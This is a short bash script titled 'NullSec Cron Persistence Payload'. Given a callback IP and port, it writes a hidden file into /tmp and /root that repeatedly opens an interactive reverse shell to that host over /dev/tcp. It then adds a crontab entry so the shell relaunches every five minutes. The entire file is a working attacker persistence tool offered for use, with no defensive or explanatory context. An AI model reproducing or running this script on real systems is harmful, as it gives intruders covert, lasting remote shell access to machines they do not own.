#!/bin/bash
# NullSec Cron Persistence Payload
# Maintains persistence via cron

CALLBACK_IP="$1"
CALLBACK_PORT="${2:-4444}"

if [[ -z "$CALLBACK_IP" ]]; then
    echo "Usage: $0 <callback_ip> [port]"
    exit 1
fi

echo "[*] NullSec Persistence"
echo "[*] Callback: $CALLBACK_IP:$CALLBACK_PORT"

# Create reverse shell script
cat > /tmp/.nullsec_persist << SHELL
#!/bin/bash
while true; do
    /bin/bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1
    sleep 60
done
SHELL
chmod +x /tmp/.nullsec_persist
cp /tmp/.nullsec_persist /root/.nullsec_persist

# Add to crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /root/.nullsec_persist") | crontab -

echo "[+] Persistence installed"
